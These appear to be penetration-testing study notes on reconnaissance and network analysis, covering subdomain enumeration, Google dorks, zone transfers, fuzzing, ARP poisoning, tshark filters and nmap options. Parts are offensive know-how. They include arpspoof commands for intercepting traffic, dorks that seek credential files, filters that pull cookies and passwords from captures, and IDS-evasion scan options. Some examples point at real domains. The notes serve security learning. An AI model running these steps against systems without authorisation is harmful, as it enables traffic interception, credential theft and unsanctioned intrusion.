  > We would get the following response from the previous command to run a whois lookup against the facebook.com domain. An example of this whois command is:
    export TARGET="facebook.com" # Assign our target to an environment variable
    whois $TARGET
  > From this output, we have gathered the following information
    Organisation	Facebook, Inc.
    Locations	US, 94025 Menlo Park, CA, 1601 Willo Rd
    Domain Email address	domain@fb.com
    Registrar Email address	abusecomplaints@registrarsafe.com
    Phone number	+1.6505434800
    Language	English (US)
    Registrar	RegistrarSafe, LLC
    New Domain	fb.com
    DNSSEC	unsigned # https://en.wikipedia.org/wiki/Domain_Name_System_Security_Extensions
    Name servers	A.NS.FACEBOOK.COM
    	B.NS.FACEBOOK.COM
    	C.NS.FACEBOOK.COM
    	D.NS.FACEBOOK.COM
* DNS Recon
	dnsrecon: Cloudfare does not hide our proxy mail server addresses really well in MX records 
  		dnsrecon -d hacerksploit.org
  	dnsdumpster.com
* Subdomain enumeration with sublist3r
[+]Certificates
	> Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections. The main reason is Certificate Transparency (CT), a project that requires every SSL/TLS certificate issued by a Certificate Authority (CA) to be published in a publicly accessible log. We will learn how to examine CT logs to discover additional domain names and subdomains for a target organization using two primary resources:
    https://censys.io
    https://crt.sh
    https://sslmate.com/certspotter/
    https://certstream.calidog.io/
    http://ct.cloudfare.com/
	  * With cURL
		  curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
      export TARGET="facebook.com"
        curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "${TARGET}_crt.sh.txt"
    * With openssl
      export TARGET="facebook.com"
      export PORT="443"
      openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "${TARGET}:${PORT}" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u
		  > If needed, we can also have them filtered by the unique subdomains
		  	curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
	> Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
	> Shodan - IP list
		for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
		for i in $(cat ip-addresses.txt);do shodan host $i;done
	> Websites
		Browsing to https://10.10.10.121/ and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.
[+] Passive infrastructure identification
  * Netcraft
    > Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting https://sitereport.netcraft.com and entering the target domain.
    > Some interesting detials we can observe from the report are:
      Background	General information about the domain, including the date it was first seen by Netcraft crawlers.
      Network	Information about the netblock owner, hosting company, nameservers, etc.
      Hosting history	Latest IPs used, webserver, and target OS.
    > We need to pay special attention to the latest IPs used. Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration allows it. This kind of technology could interfere with or alter our future testing activities.
  * Wayback Machine
    > The Internet Archive is an American digital library that provides free public access to digitalized materials, including websites, collected automatically via its web crawlers.
    > We can access several versions of these websites using the Wayback Machine(http://web.archive.org/) to find old versions that may have interesting comments in the source code or files that should not be there. This tool can be used to find older versions of a website at a point in time. Let's take a website running WordPress, for example. We may not find anything interesting while assessing it using manual methods and automated tools, so we search for it using Wayback Machine and find a version that utilizes a specific (now vulnerable) plugin. Heading back to the current version of the site, we find that the plugin was not removed properly and can still be accessed via the wp-content directory. We can then utilize it to gain remote code execution on the host and a nice bounty.
    > We can also use the tool waybackurls to inspect URLs saved by Wayback Machine and look for specific keywords. Provided we have Go set up correctly on our host, we can install the tool as follows:
      go install github.com/tomnomnom/waybackurls@latest
        cat domains.txt | waybackurls > urls
    > To get a list of crawled URLs from a domain with the date it was obtained, we can add the -dates switch to our command as follows:
      waybackurls -dates https://facebook.com > waybackurls.txt
      cat  waybackurls.txt
    > If we want to access a specific resource, we need to place the URL in the search menu and navigate to the date when the snapshot was created. As stated previously, Wayback Machine can be a handy tool and should not be overlooked. It can very likely lead to us discovering forgotten assets, pages, etc., which can lead to discovering a flaw.
    > http://web.archive.org/ ==> offensivecomputing.net ==> waybackmachine
  * webhttrack 
    webhttrack (https://www.httrack.com/ ==> sudo apt-get install webhttrack) =>  Simply open a page of the "mirrored" website in your browser, and you can browse the site from link to link, as if you were viewing it online
* Names
[+] theHarvester
  > theHarvester -d hackersploit.org -b google,linkedin
  	spyse requires a subscription but it seems to be very useful
  > TheHarvester is a simple-to-use yet powerful and effective tool for early-stage penetration testing and red team engagements.
    We can use it to gather information to help identify a company's attack surface. The tool collects emails, names, subdomains, IP addresses, and URLs
    from various public data sources for passive information gathering. For now, we will use the following modules. To automate this, we will create a file called sources.txt with the following contents: 
      Baidu	Baidu search engine.
      Bufferoverun	Uses data from Rapid7's Project Sonar - www.rapid7.com/research/project-sonar/
      Crtsh	Comodo Certificate search.
      Hackertarget	Online vulnerability scanners and network intelligence to help organizations.
      Otx	AlienVault Open Threat Exchange - https://otx.alienvault.com
      Rapiddns	DNS query tool, which makes querying subdomains or sites using the same IP easy.
      Sublist3r	Fast subdomains enumeration tool for penetration testers
      Threatcrowd	Open source threat intelligence.
      Threatminer	Data mining for threat intelligence.
      Trello	Search Trello boards (Uses Google search)
      Urlscan	A sandbox for the web that is a URL and website scanner.
      Vhost	Bing virtual hosts search.
      Virustotal	Domain search.
      Zoomeye	A Chinese version of Shodan.
  > export TARGET="facebook.com"
    cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}_${TARGET}";done
  > When the process finishes, we can extract all the subdomains found and sort them via the following command:
    cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "${TARGET}_theHarvester.txt"
  > Now we can merge all the passive reconnaissance files via:
    cat facebook.com_*.txt | sort -u > facebook.com_subdomains_passive.txt
    cat facebook.com_subdomains_passive.txt | wc -l
* Phone numbers
* Physical addresses
[+] Google Dorks
	  site:ine.com ==> Domain and subdomains
  	site:*.ine.com ==> Subdomains. To include only results on a given hostname
  	intitle:admin ==> According to the title of a page
  	inurl:admin ==> Similar to intitle but works on the URL of a resource
  	filetype:pdf,xlsx,doc,docx,zip
  	site:ine.com employees
  	intitle:index of 
  	cache:ine.com [https://web.archive.org/]
  	inurl:auth_user_file.txt | passwd.txt
  	**https://www.exploit-db.com/google-hacking-database**
  	intitle:index of credentials
  	AND, OR, &, | 
  	-: Filter out a keyword or a command's result from the query.
[+] VirustTotal
    VirusTotal maintains its DNS replication service, which is developed by preserving DNS resolutions made when users visit URLs given by them.
    To receive information about a domain, type the domain name into the search bar and click on the "Relations" tab.
[+] Leaked Password Databases
	  Password spraying (same password for different sites)
  	https://haveibeenpwned.com/
[+] Terminal tools
  	sublist3r -d[domain] google.com
  	apt install snapd && service snapd start && snap install amass && snap run amass : Ex>> snap run amass -ip -d google.com
[+] URLs and books
    https://wiki.archlinux.org/title/Domain_name_resolution
    https://www.dnsfilter.com/blog/dns-over-tls
    https://www.hackerone.com/
    https://www.apisec.ai/
    https://bugcrowd.com/
    https://www.whois.com/
    http://www.crunchbase.com
	  https://digi.ninja/projects/zonetransferme.php
    www.exploit-db.com/google-hacking-database
    google hacking penetration tester by  johnny long

###Active information gathering
[+] Active Infrastructure Indentification
  > A web application's infrastructure is what keeps it running and allows it to function. Web servers are directly involved in any web application's operation. Some of the most popular are Apache, Nginx, and Microsoft IIS, among others.

  > If we discover the webserver behind the target application, it can give us a good idea of what operating system is running on the back-end server. For example, if we find out the IIS version running, we can infer the Windows OS version in use by mapping the IIS version back to the Windows version that it comes installed on by default. Some default installations are:

    IIS 6.0: Windows Server 2003
    IIS 7.0-8.5: Windows Server 2008 / Windows Server 2008R2
    IIS 10.0 (v1607-v1709): Windows Server 2016
    IIS 10.0 (v1809-): Windows Server 2019
  > Although this is usually correct when dealing with Windows, we can not be sure in the case of Linux or BSD-based distributions as they can run different web server versions in the case of Nginx or Apache. This kind of technology could interfere with or alter our future testing activities. Nevertheless, if we deal with a web server, we will not be able to find any fingerprints about the server in HTML or JS.
  * Web Servers
    > We need to discover as much information as possible from the webserver to understand its functionality, which can affect future testing. For example, URL rewriting functionality, load balancing, script engines used on the server, or an Intrusion detection system (IDS) in place may impede some of our testing activities.
    > The first thing we can do to identify the webserver version is to look at the response headers.
      curl -I "http://${TARGET}"
    > There are also other characteristics to take into account while fingerprinting web servers in the response headers. These are:
      X-Powered-By header: This header can tell us what the web app is using. We can see values like PHP, ASP.NET, JSP, etc.
      Cookies: Cookies are another attractive value to look at as each technology by default has its cookies. Some of the default cookie values are:
          .NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE>
          PHP: PHPSESSID=<COOKIE_VALUE>
          JAVA: JSESSION=<COOKIE_VALUE>
    > Other available tools analyze common web server characteristics by probing them and comparing their responses with a database of signatures to guess information like web server version, installed modules, and enabled services. Some of these tools are:
      Whatweb recognizes web technologies, including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. We recommend reading the whatweb help menu via whatweb -h to understand the available options, like the aggression level controls or verbose output. In this case, we will use an aggression level of 3 via the -a flag and verbose output via -v.
        whatweb -a3 https://www.facebok.com -v
  	> Add-ons => builtwith or wappalyzer 
  * WAF detection with wafw00f
    > WafW00f is a web application firewall (WAF) fingerprinting tool that sends requests and analyses responses to determine if a security solution is in place.
    > https://github.com/EnableSecurity/wafw00f
	    wafw00f -l : List all WAFs that WAFW00F is able to detect
  	  -a : Find all WAFs which match the signatures, do not stop testing on the first one
      -i: Read targets from an input file
      -p: Proxy the requests
  * Aquatone
    > Aquatone is a tool for automatic and visual inspection of websites across many hosts and is convenient for quickly gaining an overview of HTTP-based attack surfaces by scanning a list of configurable ports, visiting the website with a headless Chrome browser, and taking and screenshot. This is helpful, especially when dealing with huge subdomain lists.
    > cat facebook_aquatone.txt | aquatone -out ./aquatone -screenshot-timeout 1000
    > (https://github.com/michenriksen/aquatone)
* Directories hidden from search engines
  	/robots.txt => Contains a list of directories that are not indexed by search engines.
  	/sitemap_index.xml => It tells the search engine what content is available and how to reach it.
[+] DNS Zone Transfers
  > The zone transfer is how a secondary DNS server receives information from the primary DNS server and updates it. The master-slave approach is used to organize DNS servers within a domain, with the slaves receiving updated DNS information from the master DNS. The master DNS server should be configured to enable zone transfers from secondary (slave) DNS servers, although this might be misconfigured.
  > (Another explanation): 	In certain cases, DNS server admins may want to copy or transfer zone files from one DNS server to another. If misconfigured and left unsecured, this functionality can be abused by attackers to copy the zone file from the primary DNS server to another DNS SERVER
  > For example, we will use the https://hackertarget.com/zone-transfer/ service and the zonetransfer.me domain to have an idea of the information that can be obtained via this technique. A manual approach will be the following set of commands:
    1. Identifying nameservers
      nslookup -type=NS zonetransfer.me
    2. Perform the Zone transfer using -type=any and -query=AXFR parameters
      nslookup -type=any -query=AXFR zonetransfer.me nsztm1.digi.ninja
    3. If we manage to perform a successful zone transfer for a domain, there is no need to continue enumerating this particular domain as this will extract all the available information.
[+] Gobuster
  > Gobuster is a tool that we can use to perform subdomain enumeration. It is especially interesting for us the patterns options as we have learned some naming conventions from the passive information gathering we can use to discover new subdomains following the same pattern.
  > We can use a wordlist from Seclists repository along with gobuster if we are looking for words in patterns instead of numbers. Remember that during our passive subdomain enumeration activities, we found a pattern lert-api-shv-{NUMBER}-sin6.facebook.com. We can use this pattern to discover additional subdomains. The first step will be to create a patterns.txt file with the patterns previously discovered, for example:
    lert-api-shv-{GOBUSTER}-sin6
    atlas-pp-shv-{GOBUSTER}-sin6
  > The next step will be to launch gobuster using the dns module, specifying the following options:
    dns: Launch the DNS module
      -q: Don't print the banner and other noise.
      -r: Use custom DNS server
      -d: A target domain name
      -p: Path to the patterns file
      -w: Path to the wordlist
      -o: Output file
  > export TARGET="facebook.com"
    export NS="d.ns.facebook.com"
    export WORDLIST="numbers.txt"
    gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"

      ❯ dnsenum zonetransfer.me
      ❯ fierce --domain zonetransfer.me

[+] Crawling 
  > Crawling a website is the systematic or automatic process of exploring a website to list all of the resources encountered along the way. It shows us the structure of the website we are auditing and an overview of the attack surface we will be testing in the future. We use the crawling process to find as many pages and subdirectories belonging to a website as possible.
  * ZAP
    > Zed Attack Proxy (ZAP) is an open-source web proxy that belongs to the Open Web Application Security Project (OWASP). It allows us to perform manual and automated security testing on web applications. Using it as a proxy server will enable us to intercept and manipulate all the traffic that passes through it.

    > We can use the spidering functionality following the next steps. Open ZAP, and on the top-right corner, open the browser.
    > Write the website in the address bar and add it to the scope using the first entry in the left menu.
    > Head back to the ZAP Window, right-click on the target website, click on the Attack menu, and then the Spider submenu.
    > One handy feature of ZAP is the built-in Fuzzer and Manual Request Editor. We can send any request to them to alter it manually or fuzz it with a list of payloads by right-clicking on the request and using the menu "Open/Resend with Request Editor..." or the "Fuzz..." submenu under the Attack menu.
    > (https://www.zaproxy.org/docs/desktop/start/) ==> Documentation
  * FFUF
    > ZAP spidering module only enumerates the resources it finds in links and forms, but it can miss important information such as hidden folders or backup files.
    > We can use ffuf to discover files and folders that we cannot spot by simply browsing the website. All we need to do is launch ffuf with a list of folders names and instruct it to look recursively through them.
      ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
    > We can see in the image how ffuf creates new jobs for every detected folder. This task can be very resource-intensive for the target server. If the website responds slower than usual, we can lower the rate of requests using the -rate parameter.

[+] Sensitive information disclosure
  > It is typical for the webserver and the web application to handle the files it needs to function. However, it is common to find backup or unreferenced files that can have important information or credentials. Backup or unreferenced files can be generated by creating snapshots, different versions of a file, or from a text editor without the web developer's knowledge. There are some lists of common extensions we can find in the raft-[ small | medium | large ]-extensions.txt files from SecLists(https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content).
  > We will combine some of the folders we have found before, a list of common extensions, and some words extracted from the website to see if we can find something that should not be there. The first step will be to create a file with the following folder names and save it as folders.txt.
  > Next, we will extract some keywords from the website using CeWL. We will instruct the tool to extract words with a minimum length of 5 characters -m5, convert them to lowercase --lowercase and save them into a file called wordlist.txt -w <FILE>:
    cewl -m5 --lowercase -w wordlist.txt http://192.168.10.10
  > The next step will be to combine everything in ffuf to see if we can find some juicy information. For this, we will use the following parameters in ffuf:
    ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS
      -w: We separate the wordlists by coma and add an alias to them to inject them as fuzzing points later
      -u: Our target URL with the fuzzing points.

* Cloud resources
	 > The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable. This often starts with the S3 buckets (AWS), blobs (Azure), cloud storage (GCP), which can be accessed without authentication if configured incorrectly.
	 > Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the s3-website-us-west-2.amazonaws.com server.
	[+] However, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks inurl: and intext: to narrow our search to specific terms. In the following example, we see red censored areas containing the company name
		> Google search for AWS
			intext:inlane.com inurl:amazonaws.com
		> Google search for Azure
			intext:inlane.com inurl:blob.core.windows.net
	> Third-party providers can also tell us a lot about the company's infrastructure. 
		https://domain.glass/
		https://buckets.grayhatwarfare.com/ ==> We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage
* Staff
	> Sites :
		- Linkedin
			About: Aj
		- Xing
	



* Example after recollecting DNS enumeration
	> For example, Atlassian states that the company uses this solution for software development and collaboration. If we are not familiar with this platform, we can try it for free to get acquainted with it.
	> Google Gmail indicates that Google is used for email management. Therefore, it can also suggest that we could access open GDrive folders or files with a link.
	> LogMeIn is a central place that regulates and manages remote access on many different levels. However, the centralization of such operations is a double-edged sword. If access as an administrator to this platform is obtained (e.g., through password reuse), one also has complete access to all systems and information.
	> Mailgun offers several email APIs, SMTP relays, and webhooks with which emails can be managed. This tells us to keep our eyes open for API interfaces that we can then test for various vulnerabilities such as IDOR, SSRF, POST, PUT requests, and many other attacks.
	> Outlook is another indicator for document management. Companies often use Office 365 with OneDrive and cloud resources such as Azure blob and file storage. Azure file storage can be very interesting because it works with the SMB protocol.
	> The last thing we see is INWX. This company seems to be a hosting provider where domains can be purchased and registered. The TXT record with the "MS" value is often used to confirm the domain. In most cases, it is similar to the username or ID used to log in to the management platform.
	
###ARP
* Arp
	opcode=1 for request 
	opcode=2 for reply
* Tools 
	sudo arp-scan -I ens33 -g 192.168.188.0/24
* Check arp
	> Linux 
		ip neighbour
	> Windows 
		arp -a 
	> Mac OS 
		arp
[+] ARP poisoning
	> What is and what you can do?
		> The attacker can manipulate other host's ARP cache by sending gratuitous ARP replies (unsolicited ARP replies). The atacker sends a reply without waiting for a host to perform a request.
	    	> The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
	    	> As soon as the attacker's machine receives the packets, it must forward them to the correct destination. Otherwise, the communication between the victim hosts will not work. 
	    	> This operation lets the hacker:
	    		Sniff traffic between the poisoned hosts even if the machines sit on a switched network
	    	   	Change the content of the packets thus manipulating the information exchanged by the two parties.
	    	> This kind of attack can be even used on a entire network and against a router, letting an attacker intercept the communication between a LAN and the Internet.
	
	> Tools
		apt get install dsniff: Collection of tools for network auditing and penetration test. 
		> Before running the tool, you have to enable the Linux Kernel IP Forwarding (this feature transforms a Linux box into a router. This tell your machine to forward the packets you intercept to the real destination host)
			echo 1 > /proc/sys/net/ipv4/ip_forward 
	      		arpspoof -i <interface> -t <target> -r <host>


###Traffic Analysis
	> wireshark
		Open wireshark and see the mac addresses with Statistics => Endpoints 
  		wireshark -i tun0 ==> follow TCP stream
  	  	http contains bee #For example
  	  	ip.addr == 192.168.45.64
  	  	ip.src
  	  	ip.dst
  	  	tcp.port eq
  		ip: Only packets using IP as layer 3 protocol
  		not ip: The opposite of the previous syntax | not arp and !(udp.port == 53)
  		http.request.method==GET
  		tcp port 80: Packes where the source or destination TCP port is 80
  		net 192.168.54.0/24: Packets from and to the specified network
  		src port 1234: The source port must be 1234;the transport protocol does not matter
  		src net 192.168.1.0/24: The source IP address must be in the specified network
  		host 192.168.45.65: All the packets from or to the specified host
  		host www.examplehost.com: All the packets from or to the specified hostname
  		eth.dst == [MAC.ADDRESS] #Useful to know how many routers are there
  		tcp.stream eq 0
		opcode=1 for request 
		opcode=2 for reply
  		Relative sequence numbers 
      		Protocol Hierarchy. Navigate to Statistics > Protocol Hierarchy.
      		Export HTTP Object navigate to file > Export Objects > HTTP //To see if anything is different
      		To use the Endpoints feature navigate to Statistics > Endpoints
      		HTTPS
      			Client and server agree on a protocol version
      		    	Client and server select a cryptographic algorithm
      		    	The client and server can authenticate to each other; this step is optional
      		    	Creates a secure tunnel with a public key
      		    	To load an RSA key navigate to Edit > Preferences > Protocols > TLS
	> tshark
		tshark -D
  		tshark -i ens33
  		tshark -r HTTP_traffic.pcap
  		tshark -r HTTP_traffic.pcap -c 100 //Read the first 100 packets
  		tshark -r HTTP_traffic.pcap -z io,phs -q  
  		tshark -r HTTP_traffic.pcap -z io,phs arp
  		tshark -r HTTP_traffic.pcap -Y 'ip contains amazon.in && ip.src==192.168.252.128' -Tfields e ip.src -e http.cookie
  		tshark -r HTTP_traffic.pcap -Y 'ip.src==192.168.252.128 && http' -Tfields -e http.user_agent
  		tshark -r HTTP_traffic.pcap -Y 'http'
  		tshark -r HTTP_traffic.pcap -Y 'http contains password'
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET'
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET' -Tfields -e frame.time -e ip.src -e http.request.full_uri
  		tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET && http.host==www.nytimes.com' -Tfields -e ip.dst
  		tshark -r HTTP_traffic.pcap -Y 'ip.src=192.168.188.126 && ip.dst=34.45.62.56'

###WiFi Traffic Analysis
		wireshark
    			Protocol Hierarchy ==> 802.11
    		  	(wlan.fc.type_subtype==0x0008) && !(wlan.wfa.ie.wpa.version==1) && !(wlan.tag.number==48) //Beacon frame && not wpa1 && not Robust Security Network interface // Open SSIDs
    		  	  wlan.fixed.capabilities.privacy==0 
    		  	wlan contains Home_Network
    		  	(wlan.ssid contains Amazon) && (wlan.fc.type_subtype == 0x0008) //To know if WPA is enabled
    		  	(wlan.ta == e8:de:27:16:87:18) || (wlan.ra == e8:de:27:16:87:18) //How many packets has transmited and recieved this MAC
    		  	((wlan.bssid==e8:de:27:16:87:18) && (wlan.fc.type_subtype==0x0020))
    		  	(((wlan.bssid==e8:de:27:16:87:18)) && (wlan.addr == 5c:51:88:31:a0:3b)) && (wlan.fc.type_subtype==0x0001) //Association Response 
    		tshark 
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' //Deauthentication packets
    		  	tshark -r WiFi_traffic.pcap -Y 'eapol' //Only display WPA handshake packets
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==8' -Tfields -e wlan.ssid -e wlan.bssid //Only SSID and BSSID values for all beacon frames
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==LazyArtists' -Tfields -e wlan.bssid
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ssid==Home_Network' -Tfields -e wlan_radio.channel
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.fc.type_subtype==0x000c' -Tfields -e wlan.ra
    		  	tshark -r WiFi_traffic.pcap -Y 'wlan.ta==5c:51:88:31:a0:3b && http' -Tfields -e http.user_agent
###masscan
* You could perform host discovery using masscan and then conduct a detailed scan with nmap against certain interesting hosts
	masscan -p22,80,443,53,3389,8080,445 -Pn --rate=800 --banners 192.168.188.0/24 -e tun0 --router-ip 192.168.188.133.1 --echo > massscan.conf
* You could edit 'massscan.conf' and add format = list

###NMAP
* If our target sends an SYN-ACK flagged packet back to the scanned port, Nmap detects that the port is open.
* If the packet receives an RST flag, it is an indicator that the port is closed.
* If Nmap does not receive a packet back, it will display it as filtered. Depending on the firewall configuration, certain packets may be dropped or ignored by the firewall.
[+] NMAP options
	Host discovery
    	Port scanning
    	Service enumeration and detection
    	OS detection
    	Scriptable interaction with the target service (Nmap Scripting Engine)
## Scanning Options
| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |
## Output Options
| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |
## Performance Options
| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |
####Host discovery
* Nmap
	nmap -v -oG - ==> Since no target is specified, the scan will fail but will show the ports scanned.
	sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5 ==> Scan network range
		> This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not
		> If we disable port scan (-sn), Nmap automatically ping scan with ICMP Echo Requests (-PE). Once such a request is sent, we usually expect an ICMP reply if the pinging host is alive. The more interesting fact is that our previous scans did not do that because before Nmap could send an ICMP echo request, it would send an ARP ping resulting in an ARP reply. We can confirm this with the "--packet-trace" option. To ensure that ICMP echo requests are sent, we also define the option (-PE) for this.
		> Another way to determine why Nmap has our target marked as "alive" is with the "--reason" option.
		> We see here that Nmap does indeed detect whether the host is alive or not through the ARP request and ARP reply alone. To disable ARP requests and scan our target with the desired ICMP echo requests, we can disable ARP pings by setting the "--disable-arp-ping" option. Then we can scan our target again and look at the packets sent and received.
		> An ICMP echo request can help us determine if our target is alive and identify its system. More strategies about host discovery can be found at:
			https://nmap.org/book/host-discovery-strategies.html
				--source-port <portnum> (same as -g) ==> Some naive firewall administrators make a ruleset exception in order to keep DNS (port 53) or FTP-DATA (port 20) working. Of course this opens a hole big enough to drive an Nmap ping scan through
				--date-length <length> ==> This helps make the scan less conspicuous and more like the packets generated by the ubiquitous ping diagnostics program. Several intrusion detection systems (IDS), including Snort, have alerts for zero-byte ping packets. This option evades those alerts. An option value of 32 makes an echo request look more like it came from Windows, while 56 simulates the default Linux ping.
				--ttl <value> ==>  Reducing the outgoing TTL with --ttl helps to reduce router CPU load when loops are encountered.
				--max-rtt-timeout <time> ==>  These options control how long Nmap waits for a ping response.
				--reason ==> The normal Nmap output indicates whether a host is up or not, but does not describe which discovery test(s) the host responded to. For this detail, add the --reason option. The results can be confusing for host discovery since Nmap does not always try every probe. It stops as soon as it gets a first response. So Nmap might report an ICMP echo response from a host during the run, but then a RST response might be received first during a second run and lead Nmap to report that.
				--packet-trace ==>  This option shows every packet send and received by Nmap, including details such as sequence numbers, TTL values, and TCP flags.
	nmap -sn 192.168.188.0/24 [No port scan]
		-sn: Ping scan - disable port scan
    		nmap -sn 200.200.0.0/16
    		nmap -sn 200.200.123.1-12
    		nmap -sn 172.16.12.*
    		nmap -sn 200.200.12-13.*
    		nmap -sn 10.10.*.1
    		nmap -sn 10.14.33.1,3,17
    		nmap -sn 10.14,20.3.1,3,17,233
	nmap -sP 192.188.164.0/24
		-sP: Disable port scanning
		!! => Good option to start in a LAN. Like using -sn
	
* netdiscover
	sudo netdiscover -i ens33 -r 192.168.188.0/24
* ICMP  Type 8 - echo requests
	Type 0 - echo reply 
* fping -a -g IPRANGE  
	-a: Show only alive hosts  
	-g: Ping sweep instead of a standard ping
	fping -a -g 10.54.12.0/24
  	fping -a -g 10.54.12.0 10.54.12.255 2>/dev/null
       	fping -I ens33 -g 192.168.188.0/24 -a 2>/dev/null
* Concept: 
	ping : for one host
    	fping : multiple hosts
####Port scanning and another options
* The STATE heading confirms that these ports are open. Sometimes we will see other ports listed that have a different state, such as filtered. This can happen if a firewall is only allowing access to the ports from specific addresses.
* The SERVICE heading tells us the service's name is typically mapped to the specific port number. However, the default scan will not tell us what is listening on that port. Until we instruct Nmap to interact with the service and attempt to tease out identifying information, it could be another service altogether.
* 	State		Description
	open		This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations.
	closed		When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an RST flag. This scanning method can also be used to determine if our target is alive or not.
	filtered	Nmap cannot correctly identify whether the scanned port is open or closed because either no response is returned from the target for the port or we get an error code from the target.
	unfiltered	This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed.
	open|filtered	If we do not get a response for a specific port, Nmap will set it to that state. This indicates that a firewall or packet filter may protect the port.
	closed|filtered	This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall.
* By default, Nmap scans the top 1000 TCP ports with the SYN scan (-sS). This SYN scan is set only to default 'when we run it as root' because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (-sT) is performed by default
* Port Scanning 
	--top-ports=10
	-F : Top 100 ports
	-n : No DNS resolution
	--disable-arp-ping: Disables ARP ping scan
	--packet-trace ==> Shows all packets sent and received
	-sL: List scan - simply list targets to scan
  	-iL: Input from list of hosts/networks
	-Pn: Treats all hosts as online not only those responding to ping. Skip host discovery. 
